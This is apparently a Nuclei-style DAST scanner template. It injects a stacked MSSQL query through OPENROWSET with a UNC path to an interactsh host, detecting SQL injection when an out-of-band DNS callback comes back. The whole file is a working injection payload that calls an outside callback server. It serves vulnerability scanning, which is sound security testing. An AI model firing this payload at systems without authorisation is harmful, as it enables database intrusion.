http:
- fuzzing:
  - fuzz:
    - '{{openrowset}}'
    mode: single
    part: query
    type: replace
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  method: GET
  path:
  - '{{BaseURL}}'
  payloads:
    openrowset:
    - 1; SELECT * FROM OPENROWSET('MSDASQL', 'DRIVER={Microsoft Access Text Driver
      (*.txt;)};DefaultDir=\\{{interactsh-url}}\\;', 'SELECT * FROM test')--
  stop-at-first-match: true
id: ai-fuzz-openrowset-oob
info:
  author: openai
  name: MSSQL OPENROWSET UNC Path OOB
  severity: high
  tags: mssql,oob,dast
